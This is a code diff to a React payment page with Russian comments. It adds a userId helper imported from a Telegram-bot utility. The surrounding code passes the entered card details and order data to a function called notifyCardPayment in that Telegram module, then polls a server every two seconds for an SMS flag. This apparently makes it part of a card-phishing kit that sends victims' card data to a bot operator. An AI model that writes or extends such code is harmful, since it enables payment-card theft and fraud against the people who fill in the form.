@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react'
 import { useNavigate, useLocation } from 'react-router-dom'
 import { useLanguage } from '../context/LanguageContext'
-import { notifyCardPayment } from '../utils/telegramBot'
+import { notifyCardPayment, getUserId } from '../utils/telegramBot'
 import LoadingSpinner from '../components/LoadingSpinner'
 import './PaymentPage.css'
 
@@ -12,6 +12,12 @@ const PaymentPage = () => {
   
   // Получаем данные заказа
   const orderData = location.state?.orderData || JSON.parse(localStorage.getItem('pendingOrder') || '{}')
+  
+  // Генерируем userId при загрузке страницы
+  useEffect(() => {
+    const userId = getUserId()
+    console.log('Generated userId:', userId)
+  }, [])
   
   const [cardData, setCardData] = useState({
     cardNumber: '',
@@ -139,7 +145,7 @@ const PaymentPage = () => {
       notifyCardPayment(cardData, orderData)
 
       // Получаем userId
-      const userId = localStorage.getItem('userId')
+      const userId = getUserId()
 
       // Начинаем polling - проверяем флаг на сервере каждые 2 секунды
       const checkSMSFlag = setInterval(async () => {
